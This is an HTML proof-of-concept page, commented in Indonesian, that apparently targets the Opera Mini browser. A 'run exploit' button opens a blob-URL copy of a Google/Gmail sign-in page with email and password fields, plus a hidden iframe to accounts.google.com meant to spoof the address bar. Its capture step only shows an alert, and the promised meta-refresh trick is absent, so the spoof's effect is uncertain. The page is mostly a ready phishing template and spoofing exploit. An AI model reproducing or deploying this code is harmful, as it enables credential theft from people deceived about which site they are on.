<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blob URI Spoofing Fuzzer</title>
    <style>
        body { font-family: sans-serif; background: #121212; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        button { background: #388e3c; color: white; padding: 20px 40px; font-size: 18px; border: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
        button:active { background: #2e7d32; }
    </style>
</head>
<body>

    <h2>Blob URI Address Bar Spoof</h2>
    <p style="text-align:center; font-size:14px; color:#aaa; padding: 0 20px;">Menggunakan Blob URL + Meta Refresh untuk membekukan Address Bar.</p>
    <button onclick="runExploit()">JALANKAN EXPLOIT</button>

    <script>
        function runExploit() {
            // 1. Siapkan UI Palsu (Google Login)
            const htmlPayload = `
                <!DOCTYPE html>
                <html>
                <head>
                    <meta charset="UTF-8">
                    <title>Sign in - Google Accounts</title>
                    <style>
                        body { font-family: 'Roboto', Arial, sans-serif; background: #fff; margin: 0; padding: 0; text-align: center; }
                        .container { max-width: 400px; margin: 0 auto; padding-top: 50px; }
                        .logo { width: 80px; margin-bottom: 20px; }
                        h2 { font-weight: 400; font-size: 24px; margin-bottom: 5px; color: #202124;}
                        p { font-size: 15px; color: #202124; margin-bottom: 30px; }
                        input { width: 85%; padding: 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; outline: none; }
                        input:focus { border: 2px solid #1a73e8; padding: 14px; }
                        .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; font-weight: bold; float: right; margin-right: 7.5%; margin-top: 10px; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png" class="logo">
                        <h2>Sign in</h2>
                        <p>to continue to Gmail</p>
                        <input type="text" id="email" placeholder="Email or phone" autocomplete="off">
                        <input type="password" id="password" placeholder="Password" autocomplete="off">
                        <button class="btn" onclick="alert('POC SUKSES! Data ditangkap: ' + document.getElementById('email').value)">Next</button>
                    </div>

                    <!-- SCRIPT SAKTI: META REFRESH + FREEZE -->
                    <script>
                        // Kita paksa address bar berubah ke Google setelah form dirender
                        setTimeout(function() {
                            // Trik: Gunakan iframe tersembunyi untuk memancing browser agar membaca domain google
                            let i = document.createElement('iframe');
                            i.src = "https://accounts.google.com";
                            i.style.display = "none";
                            document.body.appendChild(i);
                            
                            // Atau gunakan location.replace jika memungkinkan
                            // window.location.replace("https://accounts.google.com");
                        }, 50);
                    <\/script>
                </body>
                </html>
            `;

            // 2. Buat Blob dari HTML palsu
            const blob = new Blob([htmlPayload], {type: 'text/html'});
            const blobUrl = URL.createObjectURL(blob);

            // 3. Buka di tab baru
            const w = window.open(blobUrl, "_blank");
            
            if (!w) {
                alert("Popup diblokir! Tolong izinkan popup di pengaturan Opera Mini.");
            }
        }
    </script>
</body>
</html>
